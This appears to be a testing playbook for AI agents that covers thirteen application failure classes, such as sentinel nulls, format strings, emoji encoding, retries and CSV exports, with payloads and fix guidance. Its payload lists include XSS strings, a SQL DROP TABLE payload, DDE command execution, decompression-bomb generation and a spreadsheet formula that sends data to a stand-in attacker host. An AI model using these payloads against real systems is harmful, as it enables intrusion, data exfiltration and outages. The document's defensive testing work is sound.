# Tier-1 Agents — App-Layer Failure Classes

Thirteen agents, each defined by a **documented failure mechanism** (not a persona). Each playbook has: the precedent story (why this class is real), the mechanism, the payloads, the procedure, the observation layer, the invariant, and fix guidance. Findings are attributed to the agent whose mechanism you exercised.

Generate payloads with `scripts/payloads.py` (see SKILL.md). Origin strings below are condensed — the payload script carries the full stories.

**Contents:** 1 Literal Null · 2 Format Specifier · 3 Accidental Injector · 4 Four-Byte User · 5 Decompression Bomb · 6 Event Flood · 7 Clock Disagreer · 8 Retry Trigger · 9 Spreadsheet Payload · 10 Orphan · 11 Length Illusionist · 12 Retry Storm · 13 Real Human

---

## Agent 1 — The Literal Null

**Precedent.** Joseph Tartaro's 2016 California vanity plate `NULL`: the DMV system accepted it, then conflated the SQL absence marker with the four-character string, routing every blank-plate citation to him ($12,049 in fines). Independently, journalist Christopher Null is effectively invisible to systems that drop his surname as a null value — Amex dropped it entirely; he adds a period (`Null.`) to force string treatment.

**Mechanism.** Semantic overloading of absence markers: a syntactically valid value that a downstream layer interprets as "missing."

**Applies to.** Every field that becomes an identifier, key, lookup, or query parameter: usernames, emails, plate/SKU/code fields, search boxes, API query params, sort/filter values.

**Payloads.**
```bash
python scripts/payloads.py get null-set
```
`NULL`, `null`, `Null`, `nil`, `None`, `undefined`, `NaN`, `0`, `false`, `""` (empty), `NUL`, `\0` (literal null byte), `\\N`, `~`, `-`, `null@null.com`.

**Playbook.**
1. Submit each sentinel into each identifier-ish field, one at a time. Note which are *accepted* (validation pass) — those are the interesting ones.
2. For every accepted sentinel, **round-trip it**: re-fetch the record (profile page, search by the value, GET the resource) and compare byte-for-byte.
3. Test the *conflation* direction: submit the sentinel as user A, then perform a lookup with an actually-empty/missing value (blank search box, omitted query param) and check whether user A's record is returned.
4. Test NULL-equality in filters: if the app has "show records where X is empty," check whether `'NULL'`-valued records appear there (and vice versa).
5. In the code track: `rg "== ?null|=== ?null|IS NULL|= 'NULL'|== 'NULL'"` against string-typed columns; look for `if not value:` applied to the *string* `"None"`.

**Observe at.** The storage round-trip and the empty-lookup conflation — not the HTTP status of the submit.

**Invariant.** `NULL ≠ 'NULL'` — a sentinel string is data; absence is absence. Also: `roundtrip(sentinel) == sentinel`.

**Failure signatures → severity.** Blank-field lookup returns the sentinel user's records → **P0** (the Tartaro class: cross-customer data association). Sentinel silently dropped/coerced on storage → **P1** (Christopher Null class: record vanishes, user becomes unaddressable). Sentinel accepted but display renders "None"/"null" oddly → **P3**.

**Fix guidance.** Parameterized queries everywhere (never build `WHERE plate = 'NULL'` vs `IS NULL` from the same variable); treat the literal string as data at every layer; if a business key may legitimately equal a sentinel, use a separate presence flag rather than overloading the value.

---

## Agent 2 — The Format Specifier

**Precedent.** 2019, *Reply All* → *99% Invisible* over Bluetooth crashed a 2016 Mazda 6 infotainment system in a restart loop: the episode title contained `%In`; the C firmware interpreted track metadata as a format string (`%I`, `%n`, `%jn`, `%hhn` are printf conversion specifiers) → uncontrolled format-string bug.

**Mechanism.** User-controlled metadata reaches a printf-family consumer (native firmware, C library, logging layer, template engine) that treats `%` as an instruction.

**Applies to.** Track/media titles, filenames, display names, usernames, review text — anything that could be logged with `%`-style formatting, passed to a native layer, or shipped over Bluetooth/USB metadata channels. In web apps the realistic sink is **server logs** (log4j-style, Python `%` formatting, `console.log` with format strings) and any C/C++/Rust binding.

**Payloads.**
```bash
python scripts/payloads.py get format-strings
```
`%s`, `%n`, `%x`, `%X`, `%p`, `%d`, `%1000000x` (wide padding), `%hn`, `%hhn`, `%In`, `%jn`, `%s%s%s%s` (stack-guessing), `%25s` / `%2525s` (double-decode probes), and a 2,000-char `%`-repeat string.

**Playbook.**
1. Fire the format corpus into every text field; watch for **500 errors** (many runtimes raise `TypeError: not enough arguments for format string` when user text is used as the format), garbled responses, or log lines containing hex addresses (`0x7ffd...` — a leak via `%p`).
2. Round-trip each value — stored-vs-returned should match exactly.
3. If the app has a "template" or "greeting" feature where user text becomes a format string, that's the prime target.
4. Code track: `rg "console\.log\(.*\+|sprintf\(|String\.format\(|snprintf\(|printf\("` looking for **non-literal first arguments**; in Python `user_text % ()` or `"...".__mod__(user_input)`.

**Observe at.** Server error logs and response bodies. A `%p` appearing in an error page or log = information disclosure.

**Invariant.** User data is *data*, never a *format string*: `rendered(user_text) contains user_text verbatim`, and no memory addresses appear in output.

**Failure signatures → severity.** 500 crash on `%s` → **P1**. Hex address leak via `%p` → **P1** (info disclosure). Restart-loop-class (native layer) → **P1**. Clean echo but logs show corruption → **P3**.

**Fix guidance.** Always `printf("%s", user_data)` (constant format, variable argument); never interpolate user text into the format position; escape `%` → `%%` when user text must pass through a printf layer.

---

## Agent 3 — The Accidental Injector

**Precedent.** (a) French/Italian/Irish users *legitimately* type `L'Aquila`, `O'Brien`, `D'Angelo` — and trigger SQL errors in US shops (the explainxkcd-documented "unwitting injection"). (b) UK Companies House 2020 accepted a company literally named `"><SRC=HTTPS://MJT.XSS.HT> LTD` — stored XSS via a legal business name, later renamed `THAT COMPANY WHOSE NAME USED TO CONTAIN HTML SCRIPT TAGS LTD`. (c) A 2014 Hackaday-documented license plate carried a SQL injection payload readable by ANPR cameras — the OCR-to-database pipeline was the injection surface.

**Mechanism.** Legal human strings containing SQL/HTML metacharacters, executed because the pipeline string-concatenates instead of parameterizing/escaping.

**Applies to.** Name/address/comment fields (SQL), any field rendered back into HTML (XSS), file-upload filenames, OCR-adjacent pipelines (scanned docs, image text), User-Agent and other request headers that get stored + displayed.

**Payloads.**
```bash
python scripts/payloads.py get metachars
```
`O'Brien`, `L'Aquila`, `D'Angelo`, `Müller`, `Null.`, `"><SRC=HTTPS://MJT.XSS.HT>`, `<script>alert(1)</script>`, `&amp;`, `'"--`, `'; DROP TABLE users; --` (verification only — prefer the benign `'"` pair first), `\`; also test with `Content-Type` variations.

**Playbook.**
1. **Lead with the human strings, not the attack strings.** If `O'Brien` errors, you've found the French-user bug — that's the finding that matters most, because real users hit it daily.
2. Watch responses for: SQL error text (`SQLITE_ERROR`, `syntax error near`), 500s, escaped-vs-unescaped round-trips.
3. For XSS: submit, then render the field's page; check whether `<`/`>` survive into the DOM unescaped (inspect the actual DOM, not just the source).
4. Test the **filename surface**: upload a file named `'><svg onload=alert(1)>.png` and see how the name is echoed in listings/links.
5. Code track: `rg "SELECT|INSERT|UPDATE" -A2` looking for f-string/`+`/`%`/`.Format` concatenation; template engines with `|safe` or autoescape off.

**Observe at.** The query layer (errors) and the rendered DOM (XSS). A 500 on `O'Brien` is a *availability* bug affecting real users; a stored `<script>` that renders is a stored-XSS P0/P1.

**Invariant.** `store(legal_human_string)` succeeds and `retrieve` returns it verbatim; stored text renders as text, never markup.

**Failure signatures → severity.** Stored XSS executing on admin/other-user pages → **P0**. SQL error on apostrophe names → **P1** (breaks real users; full injection if parameterization absent → escalate to **P0** with proof). Escaped display of `<` → **P4** (correct behavior, note it).

**Fix guidance.** Parameterized queries (always, no exceptions); context-aware output encoding (HTML-encode on render, not on store); treat filenames as untrusted display strings; never trust OCR output as sanitized input.

---

## Agent 4 — The Four-Byte User

**Precedent.** A 2026-documented incident: staging stored emoji correctly, production silently wrote `???` — one character in the JDBC URL (`characterEncoding=utf8` instead of `utf8mb4`; MySQL `utf8` is really `utf8mb3`, no 4-byte characters). **47,000 records corrupted over six weeks**; 38,100 unrecoverable; ~$34,000 cost. ASCII-only users worked perfectly — total silence. Related: Mumble VoIP crashed on emoji usernames (QMYSQL backend); PHP/MySQL/XML stacks crashed on emoji in iPhone-app comments.

**Mechanism.** 4-byte UTF-8 (emoji, math symbols, CJK Extension B) vs a 3-byte-max encoding or a component that can't round-trip them.

**Applies to.** Every text field that flows into a database, email, PDF, downstream API, or XML — especially display names, bios, comments, addresses.

**Payloads.**
```bash
python scripts/payloads.py get four-byte
```
Single emoji `😀`, `🇮🇳` (regional indicators), ZWJ families `👨‍👩‍👧‍👦` (person + ZWJ + person + ZWJ + ...), skin-tone modifiers `👋🏽`, math `∑√∫≠`, CJK Ext-B `𠀀𠀁`, flag sequences, `☺️` (text→emoji presentation).

**Playbook.**
1. Submit each 4-byte payload into each text field. Record which are rejected (fine — *clear* rejection is correct behavior), accepted, or mangled.
2. **Round-trip: fetch the stored value and compare byte-for-byte.** `???`, `????`, mojibake (`ðŸ˜€`), or empty-on-read are all silent corruption. The HTTP 200 on submit means nothing.
3. For ZWJ sequences specifically: count code points before and after. A system storing "what MySQL utf8mb3 can hold" will split `👨‍👩‍👧‍👦` into 4 separate people or `???` — data destroyed while the app smiles.
4. Check the *export* surfaces too (CSV/PDF/email): corruption often only appears in the downstream render.
5. Code track: `rg "characterEncoding=utf8[^m]|charset=utf8[^m]|utf8mb3"` in connection strings; `VARCHAR(` without `CHARACTER SET utf8mb4`; XML feeds without `encoding="UTF-8"`.

**Observe at.** The stored bytes and the downstream render. This is the canonical silent-failure class — never trust the submit response.

**Invariant.** `bytes_in == bytes_out` for any accepted value; rejection must be explicit, loud, and at the boundary.

**Failure signatures → severity.** Silent `???` corruption on store → **P0** (the 47,000-record class: data destroyed with 200 OK). Crash on emoji → **P1**. Split ZWJ sequence → **P1** (identity destruction for emoji-using users). Clean rejection with clear error → **P4** (correct; note the policy).

**Fix guidance.** `utf8mb4` end-to-end (DB charset + collation, connection string, table columns); explicit validation with actionable errors at boundaries that genuinely can't support 4-byte; test fixtures that include ZWJ sequences, not just `😀`.

---

## Agent 5 — The Decompression Bomb

**Precedent.** CVE-2026-109398 in `gumlet/php-image-resize` (millions of downloads): a **56 KB PNG** declaring 4,000×4,000 decoded into ~16M pixels → instant 128 MB memory-limit breach → PHP worker crash. A handful of simultaneous uploads took the site offline with near-zero bandwidth.

**Mechanism.** Tiny file, huge *declared* dimensions; decoder allocates on trust before checking limits.

**Applies to.** Every image/PDF/archive upload surface: avatars, attachments, imports, "send us your logo" fields.

**Payloads.**
```bash
python scripts/payloads.py make bomb-png --out bomb.png    # declares 20000×20000, ~200 bytes
python scripts/payloads.py make zip-bomb --out bomb.zip    # nested archive
python scripts/payloads.py make cyclic-pdf --out loop.pdf  # feeds Agent T2-3 too
```

**Playbook.**
1. Upload the bomb PNG to each image surface. Observe: clean rejection (best), explicit dimension error (good), timeout (bad), worker crash / 502 cascade (worst).
2. Measure: does the *response time* scale with declared dimensions (they actually allocated)? Time a normal upload vs the bomb.
3. Upload the nested zip wherever archives are accepted (import/restore features).
4. On owned/staging targets only: try 3–5 near-simultaneous bomb uploads; check whether all workers saturate (this is the take-site-offline threshold).
5. Code track: image libraries called without pre-checking dimensions (`getimagesize` before `imagecreate*`, `PIL.Image.open` without `MAX_IMAGE_PIXELS` honored); zip extraction without per-entry/total size caps (`zipfile` without bomb checks); `Image.MAX_IMAGE_PIXELS = None` (Pillow's bomb protection explicitly disabled).

**Observe at.** Process health, memory, latency — and whether rejection happens *before* decode.

**Invariant.** `image.dimensions ≤ safe_limit` enforced pre-allocation; archives expand only within a total budget.

**Failure signatures → severity.** Worker OOM/crash → **P1**. Timeout/hang → **P1**. Multiple bombs exhaust all workers → **P0** (availability kill). Late rejection after full decode (wasted resources) → **P3**.

**Fix guidance.** Check declared dimensions/size *before* decoding; cap total decompressed bytes; stream-process images; queue heavy decode work with per-user limits; never disable library bomb protections (`Image.MAX_IMAGE_PIXELS` stays on).

---

## Agent 6 — The Event Flood

**Precedent.** `mousemove` fires many times per second; an unbounded handler (buffer growth, DOM writes, analytics pushes) degrades and eventually crashes the tab. Twitter's classic fix: poll inside the handler instead of processing every event.

**Mechanism.** High-frequency DOM events × unbounded per-event work = memory/CPU exhaustion client-side.

**Applies to.** Charts and data-viz components, feeds with scroll handlers, rich-text editors (keydown), drag surfaces, anything with `addEventListener('mousemove'|'scroll'|'input'|'keydown')`.

**Payloads.** No string payloads — the "payload" is *behavior*: sustained mouse movement across components, held keys, rapid scroll.

**Playbook.**
1. Open each heavy component (charts, feeds, editors) in a real browser via agent-browser.
2. Generate sustained interaction: mousemove sweeps across the chart area for 30–60 s; hold a key in the editor; scroll the feed rapidly and continuously.
3. Measure: browser memory over time (Chrome DevTools `performance.getMemory` if reachable, or the browser process RSS from the shell), FPS degradation, eventual tab crash/unresponsiveness.
4. Code track: `rg "addEventListener\('(mousemove|scroll|input|keydown|wheel|drag)"` and check each handler for throttling/debounce/polling; look for per-event array growth, per-event DOM writes, per-event network calls (analytics storms).

**Observe at.** Client memory/CPU curves over time, not the first 5 seconds.

**Invariant.** Bounded work per event window: memory stays flat under sustained input; handlers throttle or batch.

**Failure signatures → severity.** Tab crash under a minute of normal mousing → **P1** (real users with big screens do this accidentally). Memory climbing linearly with event count → **P2**. Analytics request per event → **P3** (cost + perf).

**Fix guidance.** Throttle/debounce high-frequency handlers (or poll — read state on an interval instead of reacting to every event); batch DOM writes via `requestAnimationFrame`; cap buffer lengths; sample analytics.

---

## Agent 7 — The Clock Disagreer

**Precedent.** A 2026 postmortem: a nightly batch "succeeded" for years while writing wrong values — a **hardcoded UTC offset** in config predated DST relevance; the job ran correctly *against the wrong window*, no errors, no alerts. Canonical high-stakes sibling: Mars Climate Orbiter — pound-force vs Newtons, trajectory off ~4.45×, spacecraft lost; each team's numbers were *internally consistent*, so process checks passed.

**Mechanism.** Two representations of time (or units) that each look correct alone but disagree at boundaries: hardcoded offsets vs timezone-aware math, DST transitions, token `iat`/`exp` skew windows.

**Applies to.** Scheduled/recurring features, "expires at" fields, booking windows, report date-ranges, JWT/session validation, anywhere a timezone string and an offset both appear.

**Payloads.**
```bash
python scripts/payloads.py get timezone-boundaries
```
DST spring-forward/fall-back instants (America/New_York, Europe/Dublin, Australia/Lord_Howe — the 30-minute DST zone), `23:59:59`/`00:00:00` across zones, Feb 29 dates, half-hour-offset boundaries (`Asia/Kolkata +05:30`, `Asia/Kathmandu +05:45`), token-expiry edges (`exp == iat`, `exp = iat ± 1s`).

**Playbook.**
1. Submit state-changing operations with boundary timestamps: schedule something at the DST fall-back overlap (an hour that occurs *twice*), book across midnight UTC vs local, set expiry exactly at `00:00:00` in a half-hour zone.
2. Compare representations of the same event: what the confirmation page shows, what the DB stores, what the API returns, what an email says. Any pairwise disagreement = a finding.
3. For auth: submit tokens with `exp` inside/near the skew tolerance window; check that expired-vs-valid decisions are consistent across endpoints.
4. Code track: `rg "\+05:30|\+0530|UTC\+|utc_offset|getTimezoneOffset|hours=5\.5|330\)"` — hardcoded offsets; timestamps stored without zone info (naive datetimes); `new Date(year, month, day)` vs ISO strings mixing.

**Observe at.** Cross-surface consistency of the *same logical instant* — UI vs DB vs API vs email.

**Invariant.** One instant, one answer: every representation of the same event agrees; DST/leap boundaries produce defined, idempotent behavior.

**Failure signatures → severity.** Silent wrong-window processing (batch/report class) → **P2** (wrong data, no errors — the postmortem class). Double-charged or skipped hour at DST overlap → **P2**. Token accepted as valid & expired depending on endpoint → **P1** (auth inconsistency). 30-minute skew on half-hour zones → **P2**.

**Fix guidance.** Store UTC + tz database names (never offsets) for future events; use timezone-aware types end-to-end; compute DST-boundary behavior explicitly; unit-test every half-hour-offset and both DST edges your users live in; name your units in interfaces (Mars Orbiter lesson).

---

## Agent 8 — The Retry Trigger

**Precedent.** CVE-2025-10060 (MongoDB): an **upsert retried inside a transaction** re-entered with stale state, violated the unique index, failed an invariant, and **crashed the server during commit**. The trigger isn't a malicious query — it's a transient failure plus the database's own retry logic. Sibling: WooCommerce/Stripe double-charges when a customer clicks "Place Order" twice before the spinner shows; two Payment Intents, two charges; the missing control is an **idempotency key**.

**Mechanism.** Retry after transient failure re-enters a non-idempotent operation with stale state.

**Applies to.** Payments, order placement, booking, messaging, any POST that creates — especially where the client (browser auto-retry, mobile SDK, user double-tap) or an intermediate proxy may resend.

**Payloads.** No strings — *timing behavior*: double-click, interrupt-and-resend, rapid re-submit.

**Playbook.**
1. On an owned/staging target: find the primary money/state button (Pay, Place Order, Book, Send).
2. **Double-click it** before any state change is visible (agent-browser `dblclick @ref`). Then check server state: one order or two? One charge or two?
3. **Interrupt-and-resend**: fire the POST, kill the connection before the response (curl with `--max-time 0.5`), then re-fire the identical request. Duplicates?
4. Check the request for an `Idempotency-Key` / idempotency token header; check server code for dedup on (user, cart, amount) tuples.
5. Navigate away mid-submit and return; re-submit from a stale page if the app allows.
6. Code track: payment/order handlers — `rg "payment|charge|order"` in routes; look for idempotency-key middleware; Stripe calls without an idempotency key argument; unique constraints on order numbers that would surface as 500s instead of dedup.

**Observe at.** Server-side record count and processor state (test-mode payment dashboard, DB rows) — the UI "order success" page proves nothing.

**Invariant.** `count(submissions) == count(committed_effects)` — N user retries produce exactly one charge/record.

**Failure signatures → severity.** Double charge → **P0**. Duplicate orders/records → **P1**. 500 crash on re-entry (unique-violation class) → **P1**. Button disables correctly + idempotency key present → **P4** (correct; note as passing control).

**Fix guidance.** Idempotency keys on every money/state POST (client-generated UUID, server dedup with the same key-scoped storage the payment processor uses); disable buttons on submit *and* make the endpoint idempotent anyway (UI disabling is not a control — it's a courtesy); server-side cart/order locking; unique business keys with *recovery paths*, not 500s.

---

## Agent 9 — The Spreadsheet Payload

**Precedent.** CVE-2026-86745 (Snipe-IT): a normal-privileged user put a spreadsheet formula in free-text fields; when a **superuser exported the report to Excel**, `=HYPERLINK()`/`=WEBSERVICE()` and legacy DDE executed in the admin's spreadsheet context — data exfiltration via the export. Same class documented in AVideo comment exports, Shlink visit exports (formula injection via the **User-Agent header**!), FacturaScripts accounting exports.

**Mechanism.** Data exported from the app is *interpreted as formulas* by the spreadsheet software of a privileged user. The vulnerability lives **outside the application** — the app returns 200, stores fine, and the bomb goes off in Excel.

**Applies to.** Every user-generated text field that can appear in an admin-facing CSV/Excel export: comments, tickets, product names, review titles, display names — plus stored request metadata (User-Agent is exported by analytics/visit reports).

**Payloads.**
```bash
python scripts/payloads.py get csv-formulas
```
`=HYPERLINK("http://evil.example/x?d="&A1,"click")`, `=WEBSERVICE(...)`, `=cmd|'/C calc'!A0` (DDE), leading `+`, `-`, `@` variants (`@SUM(...)` — Excel's implicit-intersection syntax re-activates formulas), tab/CR-prefixed formulas (`\t=1+1`, `\r=1+1` — bypasses naive checks that only look at the first char), `=2+5` (harmless probe: if the cell shows `7` in Excel, execution works).

**Playbook.**
1. Submit the benign probe `=2+5` into every exportable text field, plus User-Agent manipulation on stored-visit endpoints.
2. Trigger the export (admin CSV/Excel download) and **open the raw file**: does the field survive as `=2+5` or get prefixed ( `'`, `"`, tab-escape) by the exporter?
3. If you can open it in a real spreadsheet (LibreOffice available headlessly: `libreoffice --calc --convert-to csv`), check whether the cell evaluates — but raw-file inspection is usually sufficient evidence: an unprefixed leading `=` in a CSV cell *will* execute in Excel by default settings.
4. Code track: `rg "csv|excel|xlsx" ` in export endpoints — look for `csv.writer` / manual join without a formula-guard function; the guard should prefix dangerous leading chars with `'` (or wrap in quotes per RFC plus guard).

**Observe at.** The exported file's raw bytes — this is the rare agent whose evidence is a *file*, not a response.

**Invariant.** `exported_cell_does_not_execute`: any cell beginning `=`, `+`, `-`, `@`, tab, or CR is neutralized at export time.

**Failure signatures → severity.** Unescaped formula reaching an admin export → **P0** (executes on privileged desktops; exfiltration path documented). Escaped but with tab/CR bypass still open → **P1**. Guard present for `=` but missing `@`/`+`/`-` → **P1** (partial guard is a false sense of security). Fully guarded → **P4** (note passing control).

**Fix guidance.** Escape at export: prefix `'` (or wrap-and-guard) when the first character (after stripping whitespace) is `= + - @ \t \r`; apply to *all* user-controlled cells including metadata columns (User-Agent!); consider CSV-with-mimetype hardening (`text/csv` not `application/vnd.ms-excel` invites Excel interpretation).

---

## Agent 10 — The Orphan

**Precedent.** Tartaro phase two: after the $35 payment linked his identity to the `NULL` key, he was trapped — couldn't renew registration without paying fines he didn't owe, couldn't change plates without appearing to dodge fines. A single record linkage became a permanent, inescapable state association.

**Mechanism.** Abandoned flow state silently re-associated with whatever identity/context touches it next; stale sessions replay as fresh authority.

**Applies to.** Multi-step flows: payment, deletion, permission changes, email verification, password reset, checkout, onboarding.

**Payloads.** No strings — *state maneuvers*: abandon, clear, re-enter, replay.

**Playbook.**
1. Start a high-stakes flow (checkout with items, account deletion, role change). Advance to the final confirmation step. **Stop.**
2. Clear cookies + localStorage (agent-browser can evaluate JS: `localStorage.clear()`, or open a fresh context), log in as a *different* user (register a second test account first).
3. Attempt to resume: direct-URL to the last step, browser back-forward, re-submit the same form. Does user B inherit user A's cart/permissions/deletion? Does the abandoned operation execute under the new identity?
4. Token-expiry replay: start the flow, wait past token/session expiry (or force-expire via cookie manipulation if timing is impractical — note if you did), re-submit the original request. Treated as replay (rejected) or as new (executes)?
5. Code track: session middleware — state stored server-side keyed by session vs by user; `rg "session\[|sessionStorage|localStorage"` carrying flow state; endpoints that trust client-supplied step indices; password-reset tokens not invalidated after use (classic orphan).

**Observe at.** Ownership of state after identity switch — the cross-user boundary.

**Invariant.** Abandoned state is either invalidated or re-scoped to its owner; a request from identity B can never complete identity A's flow; expired tokens never resurrect.

**Failure signatures → severity.** Cross-user state inheritance (B completes A's payment/deletion/permission flow) → **P0** (privilege/data bleed). Replay after expiry executes → **P1**. Same-user stale double-execution → **P1**. Clean invalidation → **P4**.

**Fix guidance.** Bind flow state to the authenticated identity server-side (never to the session alone); invalidate on identity change, on expiry, and on completion; single-use tokens with atomic consume; re-authorize *every* step, not just the entry step.

---

## Agent 11 — The Length Illusionist

**Precedent.** CVE-2025-12758 (`validator` npm package): `isLength` accepted over-long strings due to special elements breaking length calculation → DB truncation, buffer overflows downstream, DoS. Separately: ASPRunner.NET 10.1 crashed on a 10,000-character table-name string.

**Mechanism.** What the validator counts (characters, maybe code points) ≠ what the sink counts (UTF-8 bytes, grapheme clusters, column width, display cells).

**Applies to.** Every length-limited field feeding a database column, API contract, log line, or fixed buffer.

**Payloads.**
```bash
python scripts/payloads.py get length-illusion
```
Strings whose *character* count is ≤ 10 but byte count is 2–4× (CJK `你好世界` = 12 bytes, emoji `😀😀😀` = 12 bytes), zero-width joiners/combiners (visually 1, counts 5+), ligature-expanding forms (`ﬁ` normalizes to `fi` — longer after NFKC), fullwidth forms, a null byte `\0` mid-string (terminates C-string sinks early), 10,000-char plain string (the blunt probe), combining-mark stacks (`e` + 20 × U+0301).

**Playbook.**
1. Read the field's limit from the UI/validation (maxlength attribute, error messages). Craft payloads *at* the limit in characters but 2–4× in bytes.
2. Submit; round-trip. Look for: silent truncation (stored value shorter — and truncation mid-multibyte-character produces `�` replacement chars = corruption), 500s (buffer/column overflow), validation passing but DB error.
3. Submit the 10k blunt string to every field once (including search and filter params) — watch for 500s and log flooding.
4. Null-byte probe: `abc\0def` — if anything downstream is C-based, the value becomes `abc` silently.
5. Code track: `rg "maxlength|MAX_LENGTH|isLength|\.length <|len\(" ` near validation vs the schema's column sizes (`VARCHAR(10)` = 10 *characters* in modern DBs but check the *connection* charset too); fixed-size log formatting (`%10.10s`).

**Observe at.** Stored value length + byte length vs the declared limit, and truncation-point correctness (must cut on grapheme boundaries, never mid-codepoint).

**Invariant.** `chars(validated) == bytes(sink)`: length validation uses the same unit as the storage, and truncation (if any) is grapheme-safe.

**Failure signatures → severity.** Mid-character truncation producing `�` → **P1** (corruption). Validator/sink unit mismatch with silent DB error or overflow → **P1**. 10k string 500s → **P1**. Truncation on codepoint boundary but grapheme-splitting (splitting ZWJ families) → **P3**. Correct byte-aware validation → **P4**.

**Fix guidance.** Validate in the unit the sink uses (bytes for storage, graphemes for display); reject rather than silently truncate; if truncating, cut on grapheme clusters with a library that knows them (`Intl.Segmenter`, `grapheme`); test with multibyte fixtures at the exact limit.

---

## Agent 12 — The Retry Storm

**Precedent.** A 2026 postmortem: one unhealthy service triggered retries from **twelve healthy services**; the retries kept the failing service from recovering and prolonged the outage ~30 minutes. The postmortem initially blamed the database — the real cause was **two layers of retry logic nobody knew existed** until the Envoy config was pulled. Sibling: a 20-minute self-inflicted outage from a fixed 1-second retry delay with **no jitter** — a thundering herd synchronized by the clock.

**Mechanism.** Uncoordinated retries with fixed timing amplify a partial failure into an outage; the client acts like a well-meaning but misconfigured retry layer.

**Applies to.** Endpoints involving external calls, email sending, file processing, queued work — anything slow enough that *something* upstream will retry it.

**Payloads.** Behavior: a burst of identical requests with **zero delay and no jitter**.

**Playbook.**
1. Identify a slow-ish state-changing endpoint (email sender, export generator, webhook forwarder). On an owned/staging target only.
2. Fire ~20 identical rapid requests (a `for` loop with `requests`, no sleep — *this is the whole storm*; do not scale up).
3. Measure: latency per request over the burst (climbing = queue saturation), HTTP codes (503 cascade?), and recovery time after you stop (prolonged = retry amplification inside).
4. Check response headers/code for server-side retry loops (duplicate side effects from one request — double emails are the smoking gun of an *internal* retry layer without idempotency).
5. Code track: `rg "retry|retries|backoff"` in client configs — fixed delays without jitter, retry-on-timeout stacking across layers (frontend + gateway + service), `while` retry loops without circuit breakers.

**Observe at.** Latency curve and error-rate during + *after* the burst — the storm's signature is the tail.

**Invariant.** Retries are jittered, bounded, and coordinated; a client burst cannot push the system into a self-sustaining feedback loop.

**Failure signatures → severity.** 20 gentle requests trigger 503 cascade or minute-long degradation → **P1** (the nobody-owned-the-retries class). Double side effects from internal retries → **P1** (same root as Agent 8, different owner). Latency climbs then recovers quickly → **P3**. Graceful limiting/rate caps → **P4**.

**Fix guidance.** Exponential backoff **with jitter** on every retry layer; retry budgets/coordination across layers (or retry exactly once at one layer only); circuit breakers; idempotency so internal retries are safe; load-shed with fast, honest 503s + `Retry-After` instead of slow queuing.

---

## Agent 13 — The Real Human

**Precedent.** The highest-yield findings of the whole research program, because these users are **not adversaries**: the French user typing `L'Aquila` into a US shop; the person with the legal surname `Null`; the user typing an emoji into a `utf8`-columned display name; the user who clicks Pay twice because the spinner didn't move; the researcher whose vanity plate happens to be a sentinel value.

**Mechanism.** Legitimate input that violates developer assumptions — the edge cases the PRD never imagined because its authors have ASCII names, live in one timezone, and never stored a 4-byte character.

**Applies to.** Everything. This agent runs *last* and re-reads the surface map asking: who is the most ordinary user this system will fail today?

**Payloads.** The composite of all other sets — but chosen for *legitimacy*: real place names (`L'Aquila`, `Wolverhampton`, `Zürich`, `Tsawwassen`), real name shapes (`O'Brien`, `Null`, `Müller`, `Núñez`, `Навальный`, `李伟`, hyphenated `Anne-Marie`, `Sr.`/`Jr.` suffixes, Dr. prefixes), real emoji use (a `🏁` in a display name), real double-clicks, real timezone confusion (a Kolkata user booking a `+05:30` meeting shown in `+05:00`).

**Playbook.**
1. Re-run a *legitimate-user* persona through the three flows that matter most: sign-up, core action, profile display — with the human strings above.
2. For each failure found by agents 1–12, ask: **would a normal user hit this accidentally?** If yes, severity bumps up one notch — that's the PRD-gap multiplier.
3. Look for failures no other agent covered: name fields that reject spaces or hyphens; phone fields that can't hold `+91` numbers; address fields that can't hold non-Latin scripts; forms that lose data on back-button.
4. Report these as the "normal user failure mode" section — this is the finding set executives actually act on.

**Observe at.** The whole journey, with empathy as the instrument.

**Invariant.** A user who is not trying to break anything, doesn't.

**Failure signatures → severity.** Sign-up impossible with a legal name → **P1** (you are turning away customers silently). Display corruption of legal names → **P1**. Friction/data-loss on back-button → **P2/P3**.

**Fix guidance.** Test fixtures with global names/addresses as the *default*, not the edge case; acceptance criteria written around real-world input shapes; telemetry on validation-failure reasons (turn silent customer-away into a visible metric).

---

## Quick reference

| # | Agent | One-liner | Signature invariant |
|---|---|---|---|
| 1 | Literal Null | Sentinel strings ≠ absence | `NULL ≠ 'NULL'`; roundtrip OK |
| 2 | Format Specifier | `%`-sequences reach printf layers | data is data, not format |
| 3 | Accidental Injector | Legal names carry metacharacters | legal strings store & render inert |
| 4 | Four-Byte User | utf8mb3 vs 4-byte UTF-8 | `bytes_in == bytes_out` |
| 5 | Decompression Bomb | tiny file, huge declared dims | dims checked pre-decode |
| 6 | Event Flood | unbounded high-freq handlers | flat memory under sustained input |
| 7 | Clock Disagreer | time/units disagree at boundaries | one instant, one answer |
| 8 | Retry Trigger | retry re-enters stale state | N retries → 1 effect |
| 9 | Spreadsheet Payload | exports execute as formulas | exported cell never executes |
| 10 | Orphan | abandoned state re-associates | state bound to identity |
| 11 | Length Illusionist | counted unit ≠ sink unit | validation unit == storage unit |
| 12 | Retry Storm | uncoordinated retries amplify | jittered, bounded, coordinated |
| 13 | Real Human | legitimate input breaks assumptions | normal users don't fail |
